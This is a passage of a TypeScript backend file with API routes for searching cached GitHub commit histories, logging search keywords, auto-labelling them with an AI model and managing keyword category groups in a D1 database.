      const now = new Date();
      await c.env.DB.prepare(
        'INSERT INTO commit_list_cache (workspace_id, owner, repo, date, commits_json, commit_count, cached_at) VALUES (?, ?, ?, ?, ?, ?, ?) ON CONFLICT (workspace_id, owner, repo, date) DO UPDATE SET commits_json = excluded.commits_json, commit_count = excluded.commit_count, cached_at = excluded.cached_at'
      ).bind(workspaceId, owner, repo, date, JSON.stringify(commits), commits.length, now.toISOString()).run();
      await incrementCacheStat('cache_save_count');
    } catch (e) {
      logger.warn('Failed to write commit list cache to D1', {
        owner, repo, date,
        error: e instanceof Error ? e.message : 'Unknown error',
      });
    }
  }

  return c.json({ date, commits, source: 'github' });
});

// 今月コミットしたリポジトリ一覧（commit_list_cache から当月分を集計）
app.get('/api/repositories/this-month-commits', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) return c.json({ error: 'Unauthorized' }, 401);

  if (!c.env.DB) return c.json({ repos: [] });

  const wsInfo = await getCurrentWorkspace(c.env.DB, user.sub);
  const workspaceId = wsInfo?.workspaceId ?? '';
  if (!workspaceId) return c.json({ repos: [] });

  const jstYM = getJstYearMonthParts(new Date());
  const ym = `${jstYM.year}-${String(jstYM.month).padStart(2, '0')}`;

  try {
    // commit_list_cache（日別詳細）と commit_calendar_cache（月別集計）の両方から集約
    const [listRows, calRows] = await Promise.all([
      c.env.DB.prepare(
        "SELECT owner, repo, MAX(date) AS latest_date FROM commit_list_cache WHERE workspace_id = ? AND date LIKE ? AND commit_count > 0 GROUP BY owner, repo"
      ).bind(workspaceId, `${ym}-%`).all<{ owner: string; repo: string; latest_date: string }>(),
      c.env.DB.prepare(
        "SELECT owner, repo FROM commit_calendar_cache WHERE workspace_id = ? AND year = ? AND month = ? AND total_count > 0"
      ).bind(workspaceId, jstYM.year, jstYM.month).all<{ owner: string; repo: string }>(),
    ]);
    const repoMap = new Map<string, { owner: string; repo: string; latestDate: string }>();
    for (const r of listRows.results ?? []) {
      repoMap.set(`${r.owner}/${r.repo}`, { owner: r.owner, repo: r.repo, latestDate: r.latest_date });
    }
    for (const r of calRows.results ?? []) {
      const key = `${r.owner}/${r.repo}`;
      if (!repoMap.has(key)) {
        repoMap.set(key, { owner: r.owner, repo: r.repo, latestDate: ym });
      }
    }
    const repos = [...repoMap.values()].sort((a, b) => b.latestDate.localeCompare(a.latestDate));
    return c.json({ repos });
  } catch (e) {
    logger.warn('this-month-commits failed', { error: e instanceof Error ? e.message : String(e) });
    return c.json({ repos: [] });
  }
});

// コミット履歴の全文検索
app.get('/api/repositories/search/commits', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) {
    return jsonUtf8({ error: 'Unauthorized' }, 401);
  }

  const q = (c.req.query('q') ?? '').trim();
  if (!q || q.length < 2) {
    return jsonUtf8({ error: 'Search query must be at least 2 characters' }, 400);
  }

  if (!c.env.DB) {
    return jsonUtf8({ error: 'Database not available' }, 500);
  }

  const wsInfo = await getCurrentWorkspace(c.env.DB, user.sub);
  const workspaceId = wsInfo?.workspaceId ?? '';

  if (!workspaceId) {
    return jsonUtf8({ results: [], query: q, total: 0, isNewKeyword: false });
  }

  try {
    // commit_list_cache の commits_json (JSON配列) を LIKE で全文検索
    const searchPattern = `%${q.replace(/%/g, '\\%').replace(/_/g, '\\_')}%`;
    const rows = await c.env.DB.prepare(
      `SELECT owner, repo, date, commits_json, commit_count
       FROM commit_list_cache
       WHERE workspace_id = ?
         AND commits_json LIKE ? ESCAPE '\\'
       ORDER BY date DESC
       LIMIT 100`
    ).bind(workspaceId, searchPattern).all<{
      owner: string;
      repo: string;
      date: string;
      commits_json: string;
      commit_count: number;
    }>();

    // 各行の commits_json をパースして、マッチするコミットだけ抽出
    interface SearchResultCommit {
      sha: string;
      message: string;
      authorName: string;
      authorLogin: string;
      authorAvatarUrl: string;
      date: string;
      url: string;
    }
    interface SearchResultItem {
      owner: string;
      repo: string;
      date: string;
      commits: SearchResultCommit[];
    }

    const qLower = q.toLowerCase();
    const results: SearchResultItem[] = [];
    let totalMatches = 0;

    for (const row of rows.results ?? []) {
      try {
        const commits: SearchResultCommit[] = JSON.parse(row.commits_json);
        const matched = commits.filter((commit) => {
          const msg = (commit.message ?? '').toLowerCase();
          const author = (commit.authorName ?? '').toLowerCase();
          const login = (commit.authorLogin ?? '').toLowerCase();
          const sha = (commit.sha ?? '').toLowerCase();
          return msg.includes(qLower)
            || author.includes(qLower)
            || login.includes(qLower)
            || sha.includes(qLower);
        });
        if (matched.length > 0) {
          results.push({
            owner: row.owner,
            repo: row.repo,
            date: row.date,
            commits: matched,
          });
          totalMatches += matched.length;
        }
      } catch (_e) {
        // JSONパース失敗はスキップ
      }
    }

    // リポジトリごとのヒット数を集計
    const repoHitMap = new Map<string, number>();
    for (const item of results) {
      const repoKey = `${item.owner}/${item.repo}`;
      repoHitMap.set(repoKey, (repoHitMap.get(repoKey) ?? 0) + item.commits.length);
    }

    // テーブルA・B・Cに検索結果を保存
    if (totalMatches > 0) {
      try {
        const now = new Date().toISOString();
        const repoNamesList = JSON.stringify([...repoHitMap.keys()]);
        const insertA = await c.env.DB.prepare(
          `INSERT INTO commit_search_history (user_id, search_query, total_hits, repo_names, searched_at)
           VALUES (?, ?, ?, ?, ?)`
        ).bind(user.sub, q, totalMatches, repoNamesList, now).run();

        const historyId = insertA.meta?.last_row_id;
        if (historyId) {
          const userName = user.name ?? user.sub;
          const repoStmts = [...repoHitMap.entries()].map(([repoName, hitCount]) =>
            c.env.DB!.prepare(
              `INSERT INTO commit_search_repo_stats (search_history_id, repo_name, hit_count, search_query, user_name)
               VALUES (?, ?, ?, ?, ?)`
            ).bind(historyId, repoName, hitCount, q, userName)
          );
          if (repoStmts.length > 0) {
            await c.env.DB.batch(repoStmts);
          }

          // テーブルC: コミット単位のヒット詳細（最大200件）
          const hitDetailStmts: ReturnType<typeof c.env.DB.prepare>[] = [];
          for (const item of results) {
            if (hitDetailStmts.length >= 200) break;
            const repoKey = `${item.owner}/${item.repo}`;
            for (const commit of item.commits) {
              if (hitDetailStmts.length >= 200) break;
              const shortMsg = (commit.message ?? '').split('\n')[0].substring(0, 200);
              hitDetailStmts.push(
                c.env.DB!.prepare(
                  `INSERT INTO commit_search_hit_details (search_history_id, repo_name, commit_sha, commit_message)
                   VALUES (?, ?, ?, ?)`
                ).bind(historyId, repoKey, commit.sha ?? '', shortMsg)
              );
            }
          }
          if (hitDetailStmts.length > 0) {
            await c.env.DB.batch(hitDetailStmts);
          }
        }
      } catch (saveErr) {
        logger.warn('Failed to save commit search history', {
          query: q,
          error: saveErr instanceof Error ? saveErr.message : 'Unknown error',
        });
      }
    }

    let isNewKeyword = false;
    let autoLabel: string | null = null;
    let classifyDebug: { prompt: string; rawResponse: string; resolvedLabel: string; model: string; fallback: { model: string; rawResponse: string; label: string } | null } | null = null;
    const cookieHeader = c.req.header('Cookie');
    const cookieValsSearch = getCookieValues(cookieHeader, ['user_search_label_mode', 'keyword_classify_debug']);
    const searchLabelMode = cookieValsSearch['user_search_label_mode'];
    const classifyDebugEnabled = cookieValsSearch['keyword_classify_debug'] === 'on';

    try {
      const labelInsert = await c.env.DB.prepare(
        `INSERT OR IGNORE INTO commit_search_keyword_labels (user_id, search_query, label, created_at, updated_at) VALUES (?, ?, 'uncategorized', datetime('now'), datetime('now'))`
      ).bind(user.sub, q).run();
      isNewKeyword = (labelInsert.meta?.changes ?? 0) > 0;
    } catch (labelErr) {
      logger.warn('keyword label insert failed', { query: q, error: labelErr instanceof Error ? labelErr.message : 'Unknown error' });
    }

    // 既存の未分類キーワードも auto-classify モード時は再分類対象にする。
    // classify_status='ai_success' の場合はAI正常終了済みとみなし再分類しない。
    if (!isNewKeyword && searchLabelMode === 'auto-classify') {
      try {
        const existingRow = await c.env.DB.prepare(
          `SELECT label, classify_status FROM commit_search_keyword_labels WHERE user_id = ? AND search_query = ?`
        ).bind(user.sub, q).first<{ label: string; classify_status: string | null }>();
        if (shouldReclassifyKeyword(existingRow)) {
          isNewKeyword = true;
        }
      } catch {
        // classify_status カラム未作成（マイグレーション0038未実行）の場合は旧来チェックにフォールバック
        try {
          const existingRowLegacy = await c.env.DB.prepare(
            `SELECT label FROM commit_search_keyword_labels WHERE user_id = ? AND search_query = ?`
          ).bind(user.sub, q).first<{ label: string }>();
          if (existingRowLegacy?.label === 'uncategorized') {
            isNewKeyword = true;
          }
        } catch { /* 判定失敗時は isNewKeyword のまま */ }
      }
    }

    if (isNewKeyword && searchLabelMode === 'auto-classify') {
        if (c.env.AI) {
          const DEFAULT_CLASSIFY_LABELS = ['feature', 'ui', 'tech', 'database', 'bugfix', 'ops'];
          let classifyLabels = DEFAULT_CLASSIFY_LABELS;
          try {
            const userLabelRows = await c.env.DB.prepare(
              `SELECT DISTINCT label FROM commit_search_keyword_labels WHERE user_id = ? AND label != 'uncategorized' ORDER BY label`
            ).bind(user.sub).all<{ label: string }>();
            const userLabels = (userLabelRows.results ?? []).map((r) => r.label).filter(Boolean);
            if (userLabels.length > 0) {
              classifyLabels = [...new Set([...DEFAULT_CLASSIFY_LABELS, ...userLabels])];
            }
          } catch { /* デフォルトラベルを使用 */ }
          const model = resolveAiModel(c.env.AI_MODEL);
          const classifyResult = await classifyKeywordWithAI(c.env.AI, model, q, classifyLabels);
          autoLabel = classifyResult.label;
          if (classifyDebugEnabled) {
            classifyDebug = {
              prompt: classifyResult.prompt,
              rawResponse: classifyResult.rawResponse,
              resolvedLabel: classifyResult.label,
              model: classifyResult.model,
              fallback: classifyResult.fallback ?? null,
            };
          }
          {
            // フォールバックなし＝プライマリモデルが正常応答 → ai_success（再分類不要）
            // フォールバックあり＝プライマリがタイムアウト → ai_fallback（次回再試行可）
            const classifyStatus = classifyResult.fallback ? 'ai_fallback' : 'ai_success';
            const usedModel = classifyResult.fallback ? classifyResult.fallback.model : classifyResult.model;
            let labelSaved = false;
            try {
              await c.env.DB.prepare(
                `UPDATE commit_search_keyword_labels SET label = ?, ai_model = ?, classify_status = ?, updated_at = datetime('now') WHERE user_id = ? AND search_query = ?`
              ).bind(autoLabel, usedModel, classifyStatus, user.sub, q).run();
              labelSaved = true;
            } catch {
              // classify_status カラム未作成（マイグレーション0038未実行）の場合は ai_model のみで再試行
              try {
                await c.env.DB.prepare(
                  `UPDATE commit_search_keyword_labels SET label = ?, ai_model = ?, updated_at = datetime('now') WHERE user_id = ? AND search_query = ?`
                ).bind(autoLabel, usedModel, user.sub, q).run();
                labelSaved = true;
              } catch {
                // ai_model カラムも未作成の場合は label のみで再試行
                try {
                  await c.env.DB.prepare(
                    `UPDATE commit_search_keyword_labels SET label = ?, updated_at = datetime('now') WHERE user_id = ? AND search_query = ?`
                  ).bind(autoLabel, user.sub, q).run();
                  labelSaved = true;
                } catch (updateErr) {
                  logger.warn('auto-classify label update failed', { query: q, error: updateErr instanceof Error ? updateErr.message : 'Unknown error' });
                }
              }
            }
            if (!labelSaved) {
              autoLabel = 'uncategorized';
              if (classifyDebug) classifyDebug.resolvedLabel = 'uncategorized';
            }
          }
        } else {
          // AI バインディング未設定: 未分類にフォールバック
          autoLabel = 'uncategorized';
          logger.warn('auto-classify skipped: AI binding not available', { query: q });
        }
      }

    return jsonUtf8({ results, query: q, total: totalMatches, isNewKeyword, autoLabel, classifyDebug });
  } catch (error) {
    logger.warn('Commit search failed', {
      query: q,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: 'Search failed' }, 500);
  }
});

app.post('/api/repositories/search/keyword-label', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) return jsonUtf8({ error: 'Database not available' }, 500);
  let body: { search_query?: string; label?: string };
  try {
    body = await c.req.json();
  } catch {
    return jsonUtf8({ error: 'Invalid JSON' }, 400);
  }
  const searchQuery = (body.search_query ?? '').trim();
  const label = (body.label ?? '').trim();
  if (!searchQuery || !label) return jsonUtf8({ error: '無効なパラメータです' }, 400);
  try {
    try {
      await db.prepare(
        `INSERT INTO commit_search_keyword_labels (user_id, search_query, label, created_at, updated_at) VALUES (?, ?, ?, datetime('now'), datetime('now')) ON CONFLICT(user_id, search_query) DO UPDATE SET label = excluded.label, classify_status = 'manual', updated_at = excluded.updated_at`
      ).bind(user.sub, searchQuery, label).run();
    } catch {
      // classify_status カラム未作成（マイグレーション0038未実行）の場合はカラムなしで再試行
      await db.prepare(
        `INSERT INTO commit_search_keyword_labels (user_id, search_query, label, created_at, updated_at) VALUES (?, ?, ?, datetime('now'), datetime('now')) ON CONFLICT(user_id, search_query) DO UPDATE SET label = excluded.label, updated_at = excluded.updated_at`
      ).bind(user.sub, searchQuery, label).run();
    }
    return jsonUtf8({ ok: true, search_query: searchQuery, label });
  } catch (error) {
    logger.warn('keyword label upsert failed', { searchQuery, error: error instanceof Error ? error.message : 'Unknown error' });
    return jsonUtf8({ error: 'ラベルの更新に失敗しました' }, 500);
  }
});

app.get('/api/repositories/search/category-group', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) return jsonUtf8({ error: 'Database not available' }, 500);
  const labelsParam = (c.req.query('labels') ?? '').trim();
  if (!labelsParam) return jsonUtf8({ group: null });
  const selectedLabels = labelsParam.split(',').map((l) => l.trim()).filter(Boolean).sort();
  if (selectedLabels.length < 2) return jsonUtf8({ group: null });
  try {
    await ensureGroupTable(db);
    const rows = await db.prepare(
      `SELECT id, group_name, description, categories, is_deleted FROM keyword_category_groups WHERE user_id = ?`
    ).bind(user.sub).all<{ id: string; group_name: string; description: string | null; categories: string; is_deleted: number }>();
    const filteredResults = (rows.results ?? []).filter((row) => !row.is_deleted);
    const matched = filteredResults.find((row) => {
      try {
        const cats: string[] = JSON.parse(row.categories);
        const sorted = cats.slice().sort();
        return sorted.length === selectedLabels.length && sorted.every((v, i) => v === selectedLabels[i]);
      } catch {
        return false;
      }
    });
    if (!matched) return jsonUtf8({ group: null });
    let matchCats: string[] = [];
    try { matchCats = JSON.parse(matched.categories); } catch { /* ignore */ }
    return jsonUtf8({ group: { id: matched.id, group_name: matched.group_name, description: matched.description ?? null, categories: matchCats } });
  } catch {
    return jsonUtf8({ group: null });
  }
});

app.get('/api/repositories/search/category-groups', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) return jsonUtf8({ groups: [] });
  try {
    await ensureGroupTable(db);
    const rows = await db.prepare(
      `SELECT id, group_name, description, categories FROM keyword_category_groups WHERE user_id = ? AND (is_deleted = 0 OR is_deleted IS NULL) ORDER BY group_name ASC`
    ).bind(user.sub).all<{ id: string; group_name: string; description: string | null; categories: string }>();
    const groups = (rows.results ?? []).map((r) => {
      let cats: string[] = [];
      try { cats = JSON.parse(r.categories); } catch { /* ignore */ }
      return { id: r.id, group_name: r.group_name, description: r.description ?? null, categories: cats };
    });
    return jsonUtf8({ groups });
  } catch {
    return jsonUtf8({ groups: [] });
  }
});

app.get('/api/repositories/search/category-group/check-name', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) return jsonUtf8({ error: 'Database not available' }, 500);
  const name = (c.req.query('name') ?? '').trim();
  if (!name) return jsonUtf8({ exists: false });
  try {
    await ensureGroupTable(db);
    const row = await db.prepare(
      `SELECT id FROM keyword_category_groups WHERE user_id = ? AND group_name = ? AND (is_deleted = 0 OR is_deleted IS NULL) LIMIT 1`
    ).bind(user.sub, name).first<{ id: string }>();
    return jsonUtf8({ exists: !!row });
  } catch (err) {
    const msg = err instanceof Error ? err.message : '';
    if (!msg.includes('no such table')) {
      logger.warn('category group name check failed', { error: msg });
    }
    return jsonUtf8({ exists: false });
  }
});

app.post('/api/repositories/search/category-group', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) return jsonUtf8({ error: 'Database not available' }, 500);
  let body: { group_name?: string; description?: string; categories?: string[] };
  try { body = await c.req.json(); } catch { return jsonUtf8({ error: 'Invalid JSON' }, 400); }
  const groupName = (body.group_name ?? '').trim();
  const description = (body.description ?? '').trim() || null;
  const categories = Array.isArray(body.categories) ? body.categories.map((c) => String(c).trim()).filter(Boolean) : [];
  if (!groupName) return jsonUtf8({ error: 'グループ名を入力してください' }, 400);
  if (categories.length < 2) return jsonUtf8({ error: 'カテゴリは2つ以上必要です' }, 400);
  const id = crypto.randomUUID();
  const categoriesJson = JSON.stringify(categories.slice().sort());
  const doInsert = () => db.prepare(
    `INSERT INTO keyword_category_groups (id, user_id, group_name, description, categories, created_at, updated_at) VALUES (?, ?, ?, ?, ?, datetime('now'), datetime('now'))`
  ).bind(id, user.sub, groupName, description, categoriesJson).run();
  try {
    await doInsert();
    return jsonUtf8({ ok: true, id, group_name: groupName });
  } catch (err) {
    const msg = err instanceof Error ? err.message : '';
    if (msg.includes('UNIQUE') || msg.includes('unique')) return jsonUtf8({ error: '同じ名前のグループがすでに存在します' }, 409);
    if (msg.includes('no such table') || msg.includes('no column named')) {
      try {
        await ensureGroupTable(db);
        await doInsert();
        return jsonUtf8({ ok: true, id, group_name: groupName });
      } catch (retryErr) {
        const retryMsg = retryErr instanceof Error ? retryErr.message : '';
        if (retryMsg.includes('UNIQUE') || retryMsg.includes('unique')) return jsonUtf8({ error: '同じ名前のグループがすでに存在します' }, 409);
        logger.warn('category group insert retry failed', { error: retryMsg });
        return jsonUtf8({ error: 'グループの登録に失敗しました: ' + retryMsg }, 500);
      }
    }
    logger.warn('category group insert failed', { error: msg });
    return jsonUtf8({ error: 'グループの登録に失敗しました: ' + msg }, 500);
  }
});

app.put('/api/repositories/search/category-group/:id', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) return jsonUtf8({ error: 'Database not available' }, 500);
  const id = c.req.param('id');
  let body: { group_name?: string; description?: string; categories?: string[] };
  try { body = await c.req.json(); } catch { return jsonUtf8({ error: 'Invalid JSON' }, 400); }
  const groupName = (body.group_name ?? '').trim();
  const description = (body.description ?? '').trim() || null;
  const categories = Array.isArray(body.categories) ? body.categories.map((c) => String(c).trim()).filter(Boolean) : [];
  if (!groupName) return jsonUtf8({ error: 'グループ名を入力してください' }, 400);
  if (categories.length < 2) return jsonUtf8({ error: 'カテゴリグループに所属するカテゴリバッジは2つ以上必要です' }, 400);
  const categoriesJson = JSON.stringify(categories.slice().sort());
  try {
    await ensureGroupTable(db);
    const result = await db.prepare(
      `UPDATE keyword_category_groups SET group_name = ?, description = ?, categories = ?, updated_at = datetime('now') WHERE id = ? AND user_id = ? AND (is_deleted = 0 OR is_deleted IS NULL)`
    ).bind(groupName, description, categoriesJson, id, user.sub).run();
    if ((result.meta?.changes ?? 0) === 0) return jsonUtf8({ error: '対象のグループが見つかりません' }, 404);
    return jsonUtf8({ ok: true });
  } catch (err) {
    const msg = err instanceof Error ? err.message : '';
    if (msg.includes('UNIQUE') || msg.includes('unique')) return jsonUtf8({ error: '同じ名前のグループがすでに存在します' }, 409);
    logger.warn('category group update failed', { error: msg });
    return jsonUtf8({ error: 'グループの更新に失敗しました: ' + msg }, 500);
  }
});

app.delete('/api/repositories/search/category-group/:id', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) return jsonUtf8({ error: 'Database not available' }, 500);
  const id = c.req.param('id');
  try {
    await ensureGroupTable(db);
    const result = await db.prepare(
      `UPDATE keyword_category_groups SET is_deleted = 1, deleted_at = datetime('now'), updated_at = datetime('now') WHERE id = ? AND user_id = ? AND (is_deleted = 0 OR is_deleted IS NULL)`
    ).bind(id, user.sub).run();
    if ((result.meta?.changes ?? 0) === 0) return jsonUtf8({ error: '対象のグループが見つかりません' }, 404);
    return jsonUtf8({ ok: true });
  } catch (err) {
    const msg = err instanceof Error ? err.message : '';
    logger.warn('category group delete failed', { error: msg });
    return jsonUtf8({ error: 'グループの削除に失敗しました: ' + msg }, 500);
  }
});

// 指定リポジトリにヒットしたキーワード一覧（ハイライト用）
app.get('/api/repositories/search/repo-keywords', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) return jsonUtf8({ error: 'Unauthorized' }, 401);
  if (!c.env.DB) return jsonUtf8({ error: 'Database not available' }, 500);
  const repo = (c.req.query('repo') ?? '').trim();
  if (!repo) return jsonUtf8({ keywords: [], totalKeywordCount: 0 });
  try {
    const rows = await c.env.DB.prepare(
      `SELECT h.search_query, SUM(s.hit_count) as repo_hit_count,
              COALESCE(kl.label, 'uncategorized') as label
       FROM commit_search_repo_stats s
       JOIN commit_search_history h ON s.search_history_id = h.id
       LEFT JOIN commit_search_keyword_labels kl ON kl.user_id = h.user_id AND kl.search_query = h.search_query
       WHERE h.user_id = ? AND s.repo_name = ?
       GROUP BY h.search_query
       ORDER BY repo_hit_count DESC`,
    )
      .bind(user.sub, repo)
      .all<{ search_query: string; repo_hit_count: number; label: string }>();
    const totalRow = await c.env.DB.prepare(
      `SELECT COUNT(DISTINCT search_query) as cnt
       FROM commit_search_history
       WHERE user_id = ?`,
    ).bind(user.sub).first<{ cnt: number }>();
    return jsonUtf8({ keywords: rows.results ?? [], totalKeywordCount: totalRow?.cnt ?? 0 });
  } catch (error) {
    logger.warn('Failed to fetch repo keywords', {
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: 'Failed to fetch repo keywords' }, 500);
  }
});

// 検索履歴に登場したリポジトリ名一覧（対象リポジトリセレクト用）
app.get('/api/repositories/search/repo-list', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) return jsonUtf8({ error: 'Unauthorized' }, 401);
  if (!c.env.DB) return jsonUtf8({ error: 'Database not available' }, 500);
  try {
    const rows = await c.env.DB.prepare(
      `SELECT DISTINCT s.repo_name
       FROM commit_search_repo_stats s
       JOIN commit_search_history h ON s.search_history_id = h.id
       WHERE h.user_id = ?
       ORDER BY s.repo_name ASC`,
    )
      .bind(user.sub)
      .all<{ repo_name: string }>();
    return jsonUtf8({ repos: (rows.results ?? []).map((r) => r.repo_name) });
  } catch (error) {
    logger.warn('Failed to fetch repo list', {
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: 'Failed to fetch repo list' }, 500);
  }
});

// コミット検索履歴一覧（テーブルA: ヒット総数降順）
app.get('/api/repositories/search/history', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) return jsonUtf8({ error: 'Unauthorized' }, 401);
  if (!c.env.DB) return jsonUtf8({ error: 'Database not available' }, 500);

  const cookieHeader = c.req.header('Cookie');
  const rawLabelMode = getCookieValues(cookieHeader, ['user_search_label_mode'])['user_search_label_mode'];
  const searchLabelMode = ['manual-modal', 'auto-classify'].includes(rawLabelMode ?? '') ? rawLabelMode : 'uncategorized';

  try {
    const rows = await c.env.DB.prepare(
      `SELECT h.id, h.search_query, h.total_hits, h.repo_names, h.searched_at,
              COALESCE(kl.label, 'uncategorized') AS label
       FROM commit_search_history h
       LEFT JOIN commit_search_keyword_labels kl
         ON kl.user_id = h.user_id AND kl.search_query = h.search_query
       WHERE h.user_id = ?
       UNION
       SELECT NULL, kl.search_query, 0, NULL, kl.created_at, kl.label
       FROM commit_search_keyword_labels kl
       WHERE kl.user_id = ?
       AND NOT EXISTS (
         SELECT 1 FROM commit_search_history h2
         WHERE h2.user_id = kl.user_id AND h2.search_query = kl.search_query
       )
       ORDER BY total_hits DESC
       LIMIT 200`
    ).bind(user.sub, user.sub).all<{
      id: number | null;
      search_query: string;
      total_hits: number;
      repo_names: string | null;
      searched_at: string;
      label: string;
    }>();
    return jsonUtf8({ history: rows.results ?? [], searchLabelMode });
  } catch (error) {
    logger.warn('Failed to fetch commit search history', {
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: 'Failed to fetch history' }, 500);
  }
});

// コミット検索履歴の詳細（テーブルA + テーブルBのリポジトリ別集計）
app.get('/api/repositories/search/history/:id', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) return jsonUtf8({ error: 'Unauthorized' }, 401);
  if (!c.env.DB) return jsonUtf8({ error: 'Database not available' }, 500);

  const historyId = Number(c.req.param('id'));
  if (!Number.isFinite(historyId) || historyId <= 0) {
    return jsonUtf8({ error: 'Invalid history ID' }, 400);
  }

  try {
    const header = await c.env.DB.prepare(
      `SELECT id, search_query, total_hits, repo_names, searched_at
       FROM commit_search_history
       WHERE id = ? AND user_id = ?`
    ).bind(historyId, user.sub).first<{
      id: number;
      search_query: string;
      total_hits: number;
      repo_names: string;
      searched_at: string;
    }>();

    if (!header) {
      return jsonUtf8({ error: 'Not found' }, 404);
    }

    const details = await c.env.DB.prepare(
      `SELECT repo_name, hit_count, search_query, user_name
       FROM commit_search_repo_stats
       WHERE search_history_id = ?
       ORDER BY hit_count DESC`
    ).bind(historyId).all<{
      repo_name: string;
      hit_count: number;
      search_query: string;
      user_name: string;
    }>();

    return jsonUtf8({
      history: header,
      repoStats: details.results ?? [],
    });
  } catch (error) {
    logger.warn('Failed to fetch commit search history detail', {
      historyId,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: 'Failed to fetch detail' }, 500);
  }
});

// キーワード集計: 共起キーワード・時系列・リポジトリ別件数を一括返却
app.get('/api/repositories/search/keyword-stats', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) return jsonUtf8({ error: 'Unauthorized' }, 401);
  if (!c.env.DB) return jsonUtf8({ error: 'Database not available' }, 500);

  const q = (c.req.query('q') ?? '').trim();
  const repoFilter = (c.req.query('repo') ?? '').trim();
  if (!q || q.length < 2) return jsonUtf8({ error: 'Query required' }, 400);

  try {
    // 検索イベント数・総ヒット数・初回・最終
    const summary = await c.env.DB.prepare(
      `SELECT COUNT(*) as search_count,
              SUM(total_hits) as total_hits,
              COUNT(DISTINCT DATE(searched_at)) as search_days,
              MIN(searched_at) as first_searched_at,
              MAX(searched_at) as last_searched_at
       FROM commit_search_history
       WHERE user_id = ? AND search_query = ?`
    ).bind(user.sub, q).first<{
      search_count: number;
      total_hits: number;
      search_days: number;
      first_searched_at: string;
      last_searched_at: string;
    }>();

    // リポジトリ別ヒット数合計
    const repoStats = await c.env.DB.prepare(
      `SELECT s.repo_name, SUM(s.hit_count) as total_hit_count, COUNT(*) as search_count
       FROM commit_search_repo_stats s
       JOIN commit_search_history h ON s.search_history_id = h.id
       WHERE h.user_id = ? AND s.search_query = ?
       GROUP BY s.repo_name
       ORDER BY total_hit_count DESC
       LIMIT 50`
    ).bind(user.sub, q).all<{
      repo_name: string;
      total_hit_count: number;
      search_count: number;
    }>();

    // 共起キーワード（同一リポジトリにヒットした他のクエリ）
    const coKeywordsSql = repoFilter
      ? `SELECT b.search_query, COUNT(DISTINCT b.repo_name) as shared_repo_count, SUM(b.hit_count) as total_hits
         FROM commit_search_repo_stats a
         JOIN commit_search_history ha ON a.search_history_id = ha.id
         JOIN commit_search_repo_stats b ON a.repo_name = b.repo_name
         JOIN commit_search_history hb ON b.search_history_id = hb.id
         WHERE ha.user_id = ? AND a.search_query = ?
           AND hb.user_id = ? AND b.search_query != ?
           AND a.repo_name = ?
         GROUP BY b.search_query
         ORDER BY shared_repo_count DESC, total_hits DESC
         LIMIT 30`
      : `SELECT b.search_query, COUNT(DISTINCT b.repo_name) as shared_repo_count, SUM(b.hit_count) as total_hits
         FROM commit_search_repo_stats a
         JOIN commit_search_history ha ON a.search_history_id = ha.id
         JOIN commit_search_repo_stats b ON a.repo_name = b.repo_name
         JOIN commit_search_history hb ON b.search_history_id = hb.id
         WHERE ha.user_id = ? AND a.search_query = ?
           AND hb.user_id = ? AND b.search_query != ?
         GROUP BY b.search_query
         ORDER BY shared_repo_count DESC, total_hits DESC
         LIMIT 30`;
    const coKeywordsBindArgs = repoFilter
      ? ([user.sub, q, user.sub, q, repoFilter] as (string | number)[])
      : ([user.sub, q, user.sub, q] as (string | number)[]);
    const coKeywords = await c.env.DB.prepare(coKeywordsSql)
      .bind(...coKeywordsBindArgs)
      .all<{
        search_query: string;
        shared_repo_count: number;
        total_hits: number;
      }>();

    // 日別時系列（検索回数・ヒット数）
    const timeseries = await c.env.DB.prepare(
      `SELECT DATE(searched_at) as date,
              COUNT(*) as search_count,
              SUM(total_hits) as total_hits
       FROM commit_search_history
       WHERE user_id = ? AND search_query = ?
       GROUP BY DATE(searched_at)
       ORDER BY date ASC`
    ).bind(user.sub, q).all<{
      date: string;
      search_count: number;
      total_hits: number;
    }>();

    // リポジトリ全体に対して検索したことのあるキーワードの総数
    const totalKeywordCountSql = repoFilter
      ? `SELECT COUNT(DISTINCT h.search_query) as cnt
         FROM commit_search_history h
         JOIN commit_search_repo_stats s ON s.search_history_id = h.id
         WHERE h.user_id = ? AND s.repo_name = ?`
      : `SELECT COUNT(DISTINCT search_query) as cnt
         FROM commit_search_history
         WHERE user_id = ?`;
    const totalKeywordCountRow = await c.env.DB.prepare(totalKeywordCountSql)
      .bind(...(repoFilter ? [user.sub, repoFilter] : [user.sub]))
      .first<{ cnt: number }>();
    const totalKeywordCount = totalKeywordCountRow?.cnt ?? 0;

    return jsonUtf8({
      query: q,
      summary: summary ?? null,
      repoStats: repoStats.results ?? [],
      coKeywords: coKeywords.results ?? [],
      timeseries: timeseries.results ?? [],
      totalKeywordCount,
    });
  } catch (error) {
    logger.warn('Failed to fetch keyword stats', {
      query: q,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: 'Failed to fetch keyword stats' }, 500);
  }
});

app.get('/api/repositories/search/keyword-multi-labels', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');
  if (!user) return jsonUtf8({ error: 'Unauthorized' }, 401);
  if (!c.env.DB) return jsonUtf8({ error: 'Database not available' }, 500);

  const q = (c.req.query('q') ?? '').trim();
